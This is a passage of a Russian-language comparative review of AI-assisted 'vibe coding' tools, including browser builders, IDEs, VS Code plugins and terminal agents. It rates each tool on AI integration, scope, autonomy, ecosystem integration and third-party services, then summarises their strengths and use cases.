Исследователь ИИ Саймон Уиллиссон объясняет важный нюанс: ""Если нейросеть написала каждую строчку вашего кода, но вы проверили, протестировали и полностью поняли его — это уже не вайб-кодинг, а просто использование нейросети как печатной машинки""
В данном анализе рассматриваются различные инструменты vibe coding, доступные на рынке, с целью определения их сильных и слабых сторон, а также выявления наиболее подходящих инструментов для различных сценариев использования.
Voice-to-Code: расширение возможностей вайб-кодинга
Распространение вайб-кодинга ускорило переход к программированию с помощью голосовых интерфейсов. Технология Voice-to-Code позволяет разработчикам вербально формулировать идеи, а ИИ преобразует речь в готовый и рабочий код1. Такой подход особенно полезен для: •Разработчиков с нейроразнообразием, поскольку учитывает различные когнитивные стили •Снижения барьеров входа в IT-отрасль •Ускорения процессов прототипирования и создания MVP
Как показывают практические примеры, с помощью голосового программирования и ИИ можно создать полноценное приложение за 15 минут без написания ни строчки кода вручную
Методология оценки

Для сравнительного анализа инструментов были выбраны следующие ключевые параметры:
1. Модель интеграции с AI (AI Integration Model) • Оценка типов поддерживаемых AI-моделей (проприетарные или открытые) • Глубина интеграции и степень контроля пользователя над AI • Полнота охвата процесса разработки
2. Область применения и поддержка технологий (Scope and Technology Support) • Поддерживаемые языки программирования и типы проектов • Специализация под конкретные фреймворки или универсальность
3. Уровень автономности и автоматизации (Autonomy and Automation Level) • Способность автоматически генерировать приложения по текстовому описанию • Необходимость ручного вмешательства • Реакция на изменения в требованиях
4. Интеграция с существующей инфраструктурой разработки (Development Ecosystem Integration) • Совместимость с системами контроля версий • Интеграция с CI/CD пайплайнами • Совместимость с существующими репозиториями и кодовой базой
5. Интеграция с внешними сервисами и API (Third-Party Services Integration) • Поддержка внешних сервисов ""из коробки"" • Наличие шаблонов интеграции • Возможности автоматизации при подключении сервисов
Каждый параметр оценивался по шкале от 1 до 5, где: • 1 = Очень слабая реализация • 2 = Слабая реализация • 3 = Средняя реализация • 4 = Сильная реализация • 5 = Исключительно сильная реализация
2. Выбор инструментов и их популярность
Браузерные инструменты
Инструмент
GitHub звезды
Активность репозитория
Популярность
Bolt.new
~5.8k (апрель 2025)
Высокая активность
Часто упоминается в дискуссиях, активное сообщество
Lovable
Нет публичного репозитория
Активно развивается
Популярен среди нетехнических пользователей
v0 by Vercel
~4.5k (апрель 2025)
Высокая активность
Популярен в сообществе React/Next.js
Replit
~109 репозиториев
Активное развитие
Широко используется для обучения и прототипирования
Create
Нет данных о звездах
Активно развивается
Набирает популярность как бесплатный инструмент
Trickle AI
Нет публичного репозитория
-
Упоминается для создания AI-приложений и форм
Tempo
Нет публичного репозитория
Активное развитие
Растущая популярность для React-разработки
Softgen
Нет публичного репозитория
-
Упоминается для создания веб-приложений с Firebase
Lazy AI
Нет публичного репозитория
-
Активно продвигается для бизнес-приложений
HeyBoss
Нет публичного репозитория
-
Новый инструмент с растущей популярностью
Creatr
Нет публичного репозитория
-
Ограниченные упоминания в сообществе
Data Button
Нет публичного репозитория
28 репозиториев
Позиционируется как замена CTO, растущая популярность
Rork
Нет публичного репозитория
-
Специализированное решение для мобильных приложений
IDE и редакторы кода 
Инструмент
GitHub звезды
Активность репозитория
Популярность
Windsurf Editor (Codeium)
Нет публичного репозитория
Активное развитие
Растущая популярность, хорошие отзывы
Cursor
~50k (апрель 2025)
Очень активное развитие
Один из самых популярных AI-редакторов кода
Zed
~56.9k (апрель 2025)
Активное развитие
Популярен благодаря производительности и мультиплееру
Плагины и расширения 
Инструмент
GitHub звезды
Активность репозитория
Популярность
Cline
~39.7k (апрель 2025)
Активное развитие
Популярное расширение для VS Code
Roo Code
Форк Cline, меньше звезд
Активное развитие
Растущая популярность как улучшенная версия Cline
avante.nvim
~8.4k (апрель 2025)
Активное развитие
Популярен среди пользователей Neovim
backnotprop/prompt-tower
<1k (апрель 2025)
Умеренная активность
Нишевый инструмент для управления контекстом
Augment Code
Нет публичного репозитория
Активное развитие
Растущая популярность для работы с большими кодовыми базами
Инструменты командной строки 
Инструмент
GitHub звезды
Активность репозитория
Популярность
anthropics/claude-code
Новый репозиторий
Активное развитие от Anthropic
Растущая популярность, официальный продукт Anthropic
aider
>6k (апрель 2025)
Высокая активность
Популярен среди разработчиков, использующих терминал
codename goose
>2k (апрель 2025)
Активное развитие от Block
Растущая популярность после запуска
MyCoder.ai
~200 (апрель 2025)
Умеренная активность
Растущая популярность, хорошие отзывы пользователей
ai-christianson/RA.Aid
Нет точных данных
Умеренная активность
Нишевый инструмент с уникальными возможностями
CodeSelect
<1k (апрель 2025)
Умеренная активность
Специализированный инструмент для выбора кода для AI
Мобильные приложения 
Инструмент
Популярность
Рейтинг в магазине приложений
VibeCode
Растущая популярность
Высокие оценки (4.5+ в App Store)
3. Ключевые параметры оценки 
A. Модель интеграции с AI (AI Integration Model) 
Браузерные инструменты 
Инструмент
Оценка
Обоснование
Bolt.new
4/5
Использует Claude 3.5 Sonnet с контекстом 200K, хороший контроль пользователя через интерактивный интерфейс, охватывает полный цикл разработки
Lovable
5/5
Использует Claude и другие модели, превосходная интеграция с машиной рассуждений, высокая степень контроля и полный охват процесса разработки
v0 by Vercel
4/5
Специализируется на UI компонентах React/Next.js, отличное понимание дизайна и структуры компонентов
Replit
4/5
Интеграция с Claude 3.7 Sonnet для Replit AI Agent, хорошее понимание кода, интерактивная среда
Create
3/5
Базовая интеграция с AI, ограниченный контроль и понимание контекста
Trickle AI
3/5
Простая интеграция, ориентированная на веб-сайты и формы
Tempo
4/5
Хорошая интеграция для React-разработки, понимание компонентной структуры
Softgen
3/5
Средняя интеграция с AI, основной фокус на Firebase-приложениях
Lazy AI
4/5
Хорошая интеграция с Claude, акцент на бизнес-приложениях
HeyBoss
3/5
Базовая интеграция с OpenAI, ограниченный контроль
Creatr
2/5
Минимальная интеграция с AI, больше фокуса на шаблонах
Data Button
4/5
Продвинутая AI-интеграция с фокусом на анализе данных и бизнес-логике
Rork
3/5
Средняя интеграция, специализируется на мобильных приложениях React Native
IDE и редакторы кода 
Инструмент
Оценка
Обоснование
Windsurf Editor
5/5
Превосходная интеграция с AI через Codeium, агентный интерфейс Cascade, глубокое понимание кодовой базы
Cursor
5/5
Поддержка различных моделей (Claude, GPT-4), глубокое понимание контекста кодовой базы, высокий контроль пользователя
Zed
3/5
Базовая интеграция с AI, акцент на производительности, не основной фокус продукта
Плагины и расширения 
Инструмент
Оценка
Обоснование
Cline
5/5
Глубокая интеграция с Claude 3.7 Sonnet, автономные возможности, понимание контекста и структуры проекта
Roo Code
5/5
Улучшенная версия Cline с дополнительными возможностями и лучшей памятью, расширенная интеграция с AI
avante.nvim
4/5
Хорошая интеграция для Neovim, эмуляция функций Cursor AI
prompt-tower
2/5
Базовая интеграция, фокус на управлении контекстом для LLM
Augment Code
5/5
Глубокая интеграция для больших кодовых баз, отлично справляется со сложными проектами, корпоративный уровень
Инструменты командной строки и мобильные приложения 
Инструмент
Оценка
Обоснование
claude-code
5/5
Официальный терминальный инструмент от Anthropic, превосходное понимание кода, глубокая интеграция с Claude 3.5/3.7
aider
4/5
Хорошая интеграция с различными моделями, фокус на работе с Git, понимание кодовой базы репозитория
codename goose
4/5
Продвинутый инструмент с поддержкой различных LLM и расширениями, гибкая архитектура с MCP
MyCoder.ai
3/5
Средняя интеграция, базовые функции AI, интеграция с Git
RA.Aid
4/5
Хорошая интеграция, автономная разработка на базе LangGraph, агентная архитектура
CodeSelect
3/5
Ограниченная интеграция, фокус на выборе кода для AI, подготовка контекста для других моделей
VibeCode
3/5
Средняя интеграция с AI, специализация на мобильных приложениях, базовые функции генерации кода
B. Область применения и поддержка технологий (Scope and Technology Support) 
Браузерные инструменты 
Инструмент
Оценка
Обоснование
Bolt.new
4/5
Поддержка JavaScript, TypeScript, React, Svelte, Vue, Node.js, хорошая поддержка веб-разработки и мобильных приложений через Expo
Lovable
4/5
Поддержка JavaScript, TypeScript, React, Next.js, Express, Tailwind CSS, универсальность для веб-разработки
v0 by Vercel
3/5
Специализация на React/Next.js UI компонентах с Tailwind CSS, ограниченная поддержка других технологий
Replit
5/5
Поддержка 50+ языков программирования, включая JavaScript, Python, Ruby, Java, C++, универсальность для различных проектов
Create
3/5
Средняя поддержка, основной фокус на веб-технологиях JavaScript и React
Trickle AI
2/5
Ограниченная поддержка, фокус на простых веб-сайтах и формах с HTML, CSS, JavaScript
Tempo
3/5
Специализация на React, ограниченная поддержка других технологий
Softgen
3/5
Основной фокус на JavaScript, TypeScript, React и Firebase, ограниченная поддержка других технологий
Lazy AI
3/5
Поддержка JavaScript, TypeScript, Python, веб-приложений и бизнес-инструментов
HeyBoss
3/5
Поддержка веб и мобильных приложений на JavaScript, без глубокой специализации
Creatr
2/5
Ограниченная технологическая поддержка, основной фокус на простых веб-сайтах с HTML, CSS, JavaScript
Data Button
4/5
Хорошая поддержка стеков для анализа данных и бизнес-приложений, включая JavaScript, TypeScript, Python, SQL
Rork
3/5
Специализация на React Native для мобильной разработки, ограниченная поддержка других технологий
IDE и редакторы кода 
Инструмент
Оценка
Обоснование
Windsurf Editor
5/5
Поддержка большинства языков программирования (JavaScript, TypeScript, Python, Java, C++ и др.), универсальность
Cursor
5/5
Универсальная поддержка практически всех языков программирования и фреймворков, адаптивность к различным стекам
Zed
5/5
Превосходная поддержка различных языков благодаря Tree-sitter, высокая производительность для любых типов проектов
Плагины и расширения 
Инструмент
Оценка
Обоснование
Cline
5/5
Широкая поддержка языков и технологий через VS Code, универсальность применения
Roo Code
5/5
Аналогично Cline, полная поддержка всех языков, доступных в VS Code
avante.nvim
4/5
Хорошая поддержка через Neovim, некоторые ограничения в сравнении с VS Code
prompt-tower
3/5
Умеренная технологическая поддержка, фокус на вспомогательных функциях и управлении контекстом
Augment Code
5/5
Отличная поддержка различных языков и фреймворков, специализация на больших корпоративных проектах
Инструменты командной строки и мобильные приложения 
Инструмент
Оценка
Обоснование
claude-code
4/5
Хорошая поддержка большинства языков через терминал, некоторые ограничения из-за терминального интерфейса
aider
4/5
Поддержка Python, JavaScript, Rust, Ruby, Go, C++, PHP, HTML, CSS и других языков, некоторые ограничения терминала
codename goose
4/5
Хорошая поддержка различных языков, гибкая архитектура с расширениями
MyCoder.ai
3/5
Средняя поддержка популярных языков, фокус на стандартных задачах разработки
RA.Aid
4/5
Хорошая поддержка языков через агентную архитектуру LangGraph
CodeSelect
3/5
Ограниченная поддержка, специализация на подготовке кода для AI-моделей
VibeCode
3/5
Фокус на мобильных технологиях (JavaScript, Swift, Kotlin), ограниченная поддержка других областей
C. Уровень автономности и автоматизации (Autonomy and Automation Level) 
Браузерные инструменты 
Инструмент
Оценка
Обоснование
Bolt.new
5/5
Исключительно высокий уровень автономности, автоматическая генерация полных приложений по текстовому описанию
Lovable
4/5
Высокий уровень автономности с продуманной архитектурой, некоторые ограничения при сложных требованиях
v0 by Vercel
4/5
Высокая автоматизация для UI-компонентов, ограничения в генерации полных приложений
Replit
4/5
Хорошая автоматизация с интерактивной средой, эффективная для прототипирования
Create
3/5
Средний уровень автоматизации, требуется значительное участие пользователя
Trickle AI
3/5
Ограниченная автоматизация для специфичных веб-задач, простые формы и сайты
Tempo
4/5
Хорошая автоматизация для React-разработки, специализированные функции для компонентов
Softgen
3/5
Средняя автоматизация с акцентом на Firebase-интеграцию, требует руководства
Lazy AI
4/5
Высокий уровень автономности для бизнес-приложений, хорошая автоматизация процессов
HeyBoss
3/5
Средняя автоматизация, требуется руководство пользователя для сложных задач
Creatr
2/5
Низкий уровень автономности, в основном шаблонные решения
Data Button
4/5
Хорошая автоматизация для аналитических приложений, умная обработка данных
Rork
4/5
Высокая автоматизация для мобильных приложений на React Native, эффективная генерация кода
IDE и редакторы кода 
Инструмент
Оценка
Обоснование
Windsurf Editor
4/5
Высокий уровень автономности через Cascade, некоторые задачи требуют руководства пользователя
Cursor
3/5
Средний уровень автономности, хорошая автоматизация для отдельных задач, требуется взаимодействие для сложных проектов
Zed
2/5
Низкий уровень автономности, фокус на производительности ручного программирования с минимальной автоматизацией
Плагины и расширения 
Инструмент
Оценка
Обоснование
Cline
4/5
Высокая автономность для задач в VS Code, некоторые ограничения интерфейса
Roo Code
4/5
Улучшенная автономность по сравнению с Cline, лучшая система памяти и контекста
avante.nvim
3/5
Средняя автономность, требуется значительное взаимодействие с пользователем
prompt-tower
2/5
Низкая автономность, вспомогательный инструмент для управления контекстом
Augment Code
4/5
Высокая автономность для крупных кодовых баз, хорошее понимание проектной структуры
Инструменты командной строки и мобильные приложения 
Инструмент
Оценка
Обоснование
claude-code
4/5
Высокая автономность в рамках терминального интерфейса, эффективное выполнение задач по командам пользователя
aider
3/5
Средняя автономность, требуется руководство через терминал, хорошая интеграция с Git
codename goose
4/5
Хорошая автономность через MCP-серверы, гибкая архитектура для различных задач
MyCoder.ai
3/5
Средняя автономность, базовая автоматизация стандартных задач разработки
RA.Aid
4/5
Высокая автономность благодаря агентной архитектуре, эффективное планирование и выполнение задач
CodeSelect
2/5
Низкая автономность, специализированный вспомогательный инструмент для подготовки контекста
VibeCode
3/5
Средняя автономность для мобильных приложений, базовая автоматизация на устройстве
D. Интеграция с существующей инфраструктурой разработки (Development Ecosystem Integration) 
Браузерные инструменты 
Инструмент
Оценка
Обоснование
Bolt.new
3/5
Средняя интеграция с Git, требуются дополнительные действия, ограничения с CI/CD
Lovable
3/5
Средняя интеграция с GitHub, ограничения при работе с существующими командными проектами
v0 by Vercel
4/5
Хорошая интеграция с экосистемой Vercel и Next.js, ограничения вне этой экосистемы
Replit
4/5
Хорошая интеграция с Git, собственная инфраструктура развертывания, удобная среда разработки
Create
2/5
Ограниченная интеграция с существующими системами разработки, минимальная совместимость
Trickle AI
2/5
Базовая интеграция с GitHub Pages, ограниченные возможности для командной работы
Tempo
3/5
Средняя интеграция, фокус на React-экосистеме, приемлемая совместимость
Softgen
3/5
Средняя интеграция с Firebase, ограничения при интеграции с другими системами
Lazy AI
3/5
Средняя интеграция с основными системами разработки, базовая поддержка командной работы
HeyBoss
2/5
Ограниченная интеграция с существующими системами, фокус на индивидуальном использовании
Creatr
2/5
Минимальная интеграция с инфраструктурой разработки, в основном автономная система
Data Button
3/5
Средняя интеграция с системами анализа данных, базовая совместимость с CI/CD
Rork
3/5
Средняя интеграция для мобильной разработки, базовая поддержка существующих процессов
IDE и редакторы кода 
Инструмент
Оценка
Обоснование
Windsurf Editor
4/5
Хорошая интеграция с системами разработки, поддержка Git и стандартных рабочих процессов
Cursor
5/5
Превосходная интеграция с системами контроля версий и процессами разработки, полная совместимость
Zed
4/5
Хорошая нативная интеграция с Git и стандартными процессами, фокус на командной работе
Плагины и расширения 
Инструмент
Оценка
Обоснование
Cline
5/5
Превосходная интеграция через VS Code экосистему, полная совместимость с существующими процессами
Roo Code
5/5
Аналогично Cline, полная интеграция с VS Code и всеми его возможностями
avante.nvim
4/5
Хорошая интеграция через Neovim для пользователей этого редактора
prompt-tower
3/5
Средняя интеграция как расширение VS Code, узкоспециализированная функциональность
Augment Code
5/5
Превосходная интеграция с системами разработки, Slack и другими корпоративными инструментами
Инструменты командной строки и мобильные приложения 
Инструмент
Оценка
Обоснование
claude-code
5/5
Отличная интеграция с Git и терминальными системами, понимание существующей кодовой базы
aider
5/5
Превосходная интеграция с Git прямо из терминала, глубокое понимание репозиториев
codename goose
4/5
Хорошая интеграция с локальными системами разработки, гибкие возможности расширения
MyCoder.ai
4/5
Хорошая интеграция с Git и GitHub, поддержка стандартных рабочих процессов
RA.Aid
4/5
Хорошая интеграция с системами разработки через LangGraph, понимание структуры проектов
CodeSelect
3/5
Ограниченная интеграция, специализированная функциональность для подготовки кода для AI
VibeCode
2/5
Ограниченная интеграция, фокус на мобильной разработке через iPhone-приложение, минимальная совместимость с существующими системами
E. Интеграция с внешними сервисами и API (Third-Party Services Integration) 
Браузерные инструменты 
Инструмент
Оценка
Обоснование
Bolt.new
4/5
Хорошая поддержка популярных сервисов, автоматическая интеграция с Firebase, Supabase, Clerk
Lovable
5/5
Превосходная поддержка внешних сервисов из коробки (Firebase, AWS, Vercel, Stripe, Clerk), многочисленные шаблоны
v0 by Vercel
3/5
Средняя интеграция, фокус на UI-компонентах с ограниченными API-возможностями
Replit
4/5
Хорошая поддержка внешних API через интегрированную среду, возможность подключения различных сервисов
Create
3/5
Средняя поддержка внешних сервисов, базовые возможности интеграции
Trickle AI
2/5
Ограниченная интеграция с внешними сервисами, минимальные возможности
Tempo
3/5
Средняя интеграция, фокус на React-компонентах с базовой поддержкой API
Softgen
4/5
Хорошая интеграция с Firebase, ограниченная поддержка других сервисов
Lazy AI
4/5
Хорошая поддержка бизнес-API и сервисов, интеграция с аналитическими инструментами
HeyBoss
3/5
Средняя интеграция с популярными сервисами, базовые возможности
Creatr
2/5
Минимальная интеграция с внешними сервисами, ограниченная функциональность
Data Button
5/5
Отличная интеграция с аналитическими и облачными сервисами, специализация на работе с данными
Rork
3/5
Средняя интеграция для мобильных приложений, поддержка основных сервисов (Firebase, Expo)
IDE и редакторы кода 
Инструмент
Оценка
Обоснование
Windsurf Editor
4/5
Хорошая поддержка внешних сервисов через веб-поиск и дополнительные интеграции
Cursor
3/5
Средняя поддержка внешних сервисов, требуется ручная настройка для сложных интеграций
Zed
3/5
Ограниченная прямая поддержка внешних сервисов, акцент на производительности редактора
Плагины и расширения 
Инструмент
Оценка
Обоснование
Cline
3/5
Средняя поддержка внешних сервисов через VS Code, отсутствие специализированных интеграций
Roo Code
4/5
Улучшенная поддержка по сравнению с Cline, дополнительные интеграционные возможности
avante.nvim
2/5
Ограниченная поддержка внешних сервисов, минимальные возможности интеграции
prompt-tower
2/5
Минимальная интеграция с внешними сервисами, узкоспециализированный инструмент
Augment Code
4/5
Хорошая интеграция с популярными API и корпоративными сервисами, поддержка типичных интеграций
Инструменты командной строки и мобильные приложения 
Инструмент
Оценка
Обоснование
claude-code
3/5
Средняя поддержка внешних сервисов через командную строку, ограничения терминального интерфейса
aider
3/5
Средняя поддержка, работа с API через командную строку, ограниченная автоматизация
codename goose
4/5
Хорошая поддержка через MCP и расширения, возможность подключения различных сервисов
MyCoder.ai
3/5
Средняя интеграция с популярными сервисами и API, базовые возможности
RA.Aid
4/5
Хорошая поддержка через LangGraph, гибкая архитектура для различных интеграций
CodeSelect
2/5
Ограниченная интеграция с внешними сервисами, специализированная функциональность
VibeCode
3/5
Средняя интеграция для мобильных приложений, поддержка типичных мобильных сервисов
4. Сравнительные таблицы 
Общая сравнительная таблица (все инструменты) 
Инструмент
AI (A)
Область (B)
Автономность (C)
Интеграция (D)
Сервисы (E)
Суммарный балл
Тип пользователя
Bolt.new
4/5
4/5
5/5
3/5
4/5
20/25
Прототипирование, веб/мобильная разработка
Lovable
5/5
4/5
4/5
3/5
5/5
21/25
Нетехнические пользователи, бизнес-приложения
v0 by Vercel
4/5
3/5
4/5
4/5
3/5
18/25
UI-разработчики, React/Next.js
Replit
4/5
5/5
4/5
4/5
4/5
21/25
Универсальная разработка, образование
Create
3/5
3/5
3/5
2/5
3/5
14/25
Простые веб-проекты, нетехнические пользователи
Trickle AI
3/5
2/5
3/5
2/5
2/5
12/25
Веб-сайты, формы, нетехнические пользователи
Tempo
4/5
3/5
4/5
3/5
3/5
17/25
React-разработчики
Softgen
3/5
3/5
3/5
3/5
4/5
16/25
Firebase-приложения, веб-разработка
Lazy AI
4/5
3/5
4/5
3/5
4/5
18/25
Бизнес-приложения, автоматизация
HeyBoss
3/5
3/5
3/5
2/5
3/5
14/25
Новички, простые приложения
Creatr
2/5
2/5
2/5
2/5
2/5
10/25
Простые лендинги, нетехнические пользователи
Data Button
4/5
4/5
4/5
3/5
5/5
20/25
Аналитические приложения, работа с данными
Rork
3/5
3/5
4/5
3/5
3/5
16/25
Мобильная разработка, React Native
Windsurf Editor
5/5
5/5
4/5
4/5
4/5
22/25
Универсальная разработка, профессионалы
Cursor
5/5
5/5
3/5
5/5
3/5
21/25
Профессиональная разработка, все языки
Zed
3/5
5/5
2/5
4/5
3/5
17/25
Производительность, командная работа
Cline
5/5
5/5
4/5
5/5
3/5
22/25
VS Code пользователи, все языки
Roo Code
5/5
5/5
4/5
5/5
4/5
23/25
VS Code пользователи, продвинутые возможности
avante.nvim
4/5
4/5
3/5
4/5
2/5
17/25
Neovim пользователи
prompt-tower
2/5
3/5
2/5
3/5
2/5
12/25
Управление контекстом для LLM
Augment Code
5/5
5/5
4/5
5/5
4/5
23/25
Крупные кодовые базы, командная разработка
claude-code
5/5
4/5
4/5
5/5
3/5
21/25
Терминальные пользователи, работа с репозиториями
aider
4/5
4/5
3/5
5/5
3/5
19/25
Терминальные пользователи, Git-интеграция
codename goose
4/5
4/5
4/5
4/5
4/5
20/25
Локальное выполнение, различные LLM
MyCoder.ai
3/5
3/5
3/5
4/5
3/5
16/25
Командная строка, Git-интеграция
RA.Aid
4/5
4/5
4/5
4/5
4/5
20/25
Автономная разработка, LangGraph
CodeSelect
3/5
3/5
2/5
3/5
2/5
13/25
Подготовка контекста для AI
VibeCode
3/5
3/5
3/5
2/5
3/5
14/25
Мобильная разработка на iOS
 Лидеры по категориям 
 Лидеры среди браузерных инструментов 
Lovable (21/25) - Отличная интеграция с AI и внешними сервисами
Replit (21/25) - Универсальность и отличная поддержка технологий
Bolt.new (20/25) - Превосходная автоматизация и генерация приложений
Data Button (20/25) - Специализация на данных и бизнес-аналитике
Лидеры среди IDE и редакторов кода 
Windsurf Editor (22/25) - Сбалансированный набор возможностей и AI-интеграция
Cursor (21/25) - Отличная интеграция с экосистемой разработки
Zed (17/25) - Фокус на производительности и командной работе
Лидеры среди плагинов и расширений 
Roo Code (23/25) - Наиболее полный и сбалансированный набор возможностей
Augment Code (23/25) - Специализация на корпоративной разработке
Cline (22/25) - Отличная интеграция с VS Code и AI
Лидеры среди инструментов командной строки и мобильных приложений 
claude-code (21/25) - Официальный инструмент от Anthropic с глубоким пониманием кода
codename goose и RA.Aid (20/25) - Гибкие возможности и расширяемость
aider (19/25) - Отличная Git-интеграция и понимание репозиториев
 5. Радар-графики 

6. Подробный анализ сильных и слабых сторон 
Браузерные инструменты 
Bolt.new 
Сильные стороны:
Исключительно высокий уровень автоматизации процесса создания приложений
Встроенная среда разработки с отладкой и визуальным редактированием
Отличная интеграция с популярными сервисами и хранилищами данных
Быстрая генерация полнофункциональных приложений по текстовому описанию
Слабые стороны:
Ограниченная интеграция с существующими системами контроля версий
Может возникать потребление токенов при сложных запросах
Некоторые ограничения в работе с крупными, сложно структурированными проектами
Сценарии использования:
Идеален для быстрого прототипирования веб-приложений
Подходит для стартапов и малых команд, создающих MVP
Отлично работает для учебных проектов и экспериментов
Lovable 
Сильные стороны:
Превосходная интеграция с AI и машиной рассуждений
Отличная поддержка внешних сервисов и API из коробки
Высокое качество генерируемого кода и продуманная архитектура
Хорошая документация и обучающие материалы
Слабые стороны:
Ограниченные возможности для глубокой интеграции с существующими проектами
Более высокая стоимость по сравнению с некоторыми конкурентами
Может требоваться больше ручных корректировок для специфических требований
Сценарии использования:
Идеален для создания коммерческих приложений с интеграцией сервисов
Подходит для непрограммистов и бизнес-аналитиков
Отлично работает для проектов с чётко определёнными требованиями
v0 by Vercel 
Сильные стороны:
Специализация на высококачественных UI-компонентах для React/Next.js
Тесная интеграция с экосистемой Vercel
Хорошее понимание дизайн-системы и Tailwind CSS
Готовые шаблоны и компоненты высокого качества
Слабые стороны:
Ограниченная поддержка технологий вне React/Next.js
Не предназначен для создания полных приложений, фокус только на UI
Ограниченная интеграция с внешними сервисами и API
Сценарии использования:
Идеален для UI-разработчиков, работающих с React/Next.js
Хорошо подходит для создания и прототипирования интерфейсов
Отлично дополняет существующий процесс разработки интерфейсов
Replit 
Сильные стороны:
Полная интегрированная среда разработки в браузере
Поддержка более 50 языков программирования
Встроенная система деплоя и хостинга
Отличные образовательные возможности и совместная работа
Слабые стороны:
Некоторые ограничения производительности в браузерной среде
Ограничения бесплатного плана для более крупных проектов
Может быть избыточным для очень простых задач
Сценарии использования:
Универсальная разработка для различных языков
Образовательные цели и обучение программированию
Совместная разработка и прототипирование
Data Button 
Сильные стороны:
Специализация на работе с данными и бизнес-аналитикой
Отличная интеграция с аналитическими и облачными сервисами
Автоматизация создания аналитических дашбордов и инструментов
Ориентация на бизнес-пользователей без глубоких технических знаний
Слабые стороны:
Ограниченная универсальность вне специализированной области
Средняя интеграция с существующими системами разработки
Может требовать дополнительной настройки для сложных аналитических задач
Сценарии использования:
Идеален для создания аналитических инструментов и дашбордов
Подходит для бизнес-аналитиков и работы с данными
Хорош для быстрой визуализации и анализа данных
IDE и редакторы кода 
Windsurf Editor 
Сильные стороны:
Агентный интерфейс Cascade для глубокого понимания кодовой базы
Поддержка широкого спектра языков программирования
Продвинутая система подсказок и автоматизации через Supercomplete
Интеграция с веб-поиском и локальным индексированием проектов
Слабые стороны:
Относительно новый продукт, всё ещё развивающийся
Может требовать привыкания к агентной модели взаимодействия
Периодически может генерировать не оптимальные решения
Сценарии использования:
Универсальная разработка для различных языков и фреймворков
Профессиональная разработка с использованием AI-ассистента
Работа с существующими крупными кодовыми базами
Cursor 
Сильные стороны:
Универсальность и поддержка практически любых языков программирования
Превосходная интеграция с существующими процессами разработки
Глубокое понимание контекста кодовой базы
Отличный баланс между автоматизацией и контролем
Слабые стороны:
Требует больше ручного вмешательства для сложных задач
Ограниченные возможности автоматизации полного цикла разработки
Менее удобен для быстрого создания полноценных приложений с нуля
Сценарии использования:
Идеален для профессиональных разработчиков, работающих с существующими проектами
Подходит для команд, переходящих к использованию AI в разработке
Отлично работает для анализа и улучшения существующего кода
Zed 
Сильные стороны:
Исключительная производительность и скорость работы
Превосходная поддержка различных языков программирования
Встроенная функциональность для совместной работы в режиме реального времени
Нативная поддержка Git и основных процессов разработки
Слабые стороны:
Ограниченная интеграция с AI по сравнению с другими инструментами
Низкий уровень автоматизации процессов разработки
Требует больше ручного программирования
Сценарии использования:
Идеален для разработчиков, ценящих производительность и скорость
Подходит для командной разработки с функцией мультиплеера
Отлично работает для проектов, где ручное кодирование предпочтительнее автоматизации
Плагины и расширения 
Cline 
Сильные стороны:
Глубокая интеграция с Claude 3.7 Sonnet для автономных возможностей
Отличное взаимодействие с редактором и терминалом в VS Code
Поддержка Model Context Protocol (MCP) для расширения возможностей
Универсальность благодаря экосистеме VS Code
Слабые стороны:
Ограничения, связанные с интерфейсом VS Code
Средняя интеграция с внешними сервисами и API
Требует настройки для оптимального использования
Сценарии использования:
Идеален для разработчиков, использующих VS Code
Подходит для работы с существующими проектами различных языков
Хорошо интегрируется в существующие рабочие процессы
Roo Code 
Сильные стороны:
Усовершенствованная версия Cline с дополнительными возможностями
Улучшенная система памяти и контекста
Повышенная автономность и понимание кодовой базы
Все преимущества интеграции с VS Code
Слабые стороны:
Разделяет некоторые ограничения Cline как VS Code расширения
Может требовать дополнительной настройки
Как форк Cline, зависит от его развития
Сценарии использования:
Идеален для пользователей VS Code, желающих расширенную функциональность Cline
Подходит для работы с более сложными проектами, требующими памяти контекста
Хорошо интегрируется в существующие рабочие процессы
Augment Code 
Сильные стороны:
Глубокое понимание существующей кодовой базы
Корпоративный уровень интеграций и возможностей
Отличная совместимость с командными процессами разработки
Интеграция со Slack и другими корпоративными инструментами
Слабые стороны:
Может быть избыточен для небольших проектов
Требует некоторого времени для обучения и адаптации
Корпоративная ориентация может быть ограничением для индивидуальных разработчиков
Сценарии использования:
Идеален для корпоративной разработки и крупных кодовых баз
Подходит для команд, требующих глубокой интеграции с существующими процессами
Отлично работает с Enterprise-уровня проектами
Инструменты командной строки и мобильные приложения 
claude-code 
Сильные стороны:
Глубокое понимание существующей кодовой базы
Превосходная интеграция с Git и процессами командной строки
Автономная работа без переключения между инструментами
Специализированные команды для типичных задач разработки
Слабые стороны:
Ограниченный пользовательский интерфейс (только терминал)
Менее удобен для визуальных задач разработки
Требует определённой адаптации к терминальному рабочему процессу
Сценарии использования:
Идеален для разработчиков, предпочитающих терминал
Подходит для работы с существующими проектами и кодовыми базами
Отлично работает в сочетании с другими терминальными инструментами
aider 
Сильные стороны:
Превосходная интеграция с Git прямо из терминала
Поддержка широкого спектра языков программирования
Понимание контекста кодовой базы репозитория
Открытый исходный код и активное сообщество
Слабые стороны:
Ограничения терминального интерфейса
Средняя автономность, требуется руководство пользователя
Ограниченная интеграция с внешними сервисами
Сценарии использования:
Идеален для разработчиков, использующих Git и терминал
Подходит для работы с существующими репозиториями
Хорошо интегрируется с традиционными процессами разработки
codename goose 
Сильные стороны:
Локальное выполнение с поддержкой различных LLM
Гибкая архитектура с MCP-серверами и расширениями
Хорошая автономность и понимание задач
Открытый исходный код и расширяемость
Слабые стороны:
Более сложная настройка по сравнению с некоторыми аналогами
Требует некоторого времени для освоения архитектуры
Относительно новый инструмент, всё ещё активно развивается
Сценарии использования:
Идеален для разработчиков, предпочитающих локальное выполнение
Подходит для работы с различными LLM, включая локальные модели
Хорошо работает для тех, кто ценит контроль и расширяемость
7. Технологический стек инструментов 
Браузерные инструменты 
Bolt.new 
Языки программирования: JavaScript, TypeScript, HTML, CSS, Python (через серверные функции)
Фреймворки/библиотеки: React, Vue, Svelte, Next.js, Express, SolidJS
Архитектура:
Фронтенд: компонентная архитектура на WebContainers
Бэкенд: Serverless функции
Базы данных: SQLite, MongoDB (через интеграции)
Облачные интеграции: Firebase, Supabase, Clerk, Vercel для деплоя
AI модели: Claude 3.5 Sonnet (контекст 200K), токенная система оплаты
Особенности развертывания: Мгновенный деплой через собственную инфраструктуру, экспорт проектов
Lovable 
Языки программирования: JavaScript, TypeScript, HTML, CSS
Фреймворки/библиотеки: React, Next.js, Express, Tailwind CSS
Архитектура:
Фронтенд: React-компоненты
Бэкенд: Node.js, Express
Базы данных: PostgreSQL, MongoDB
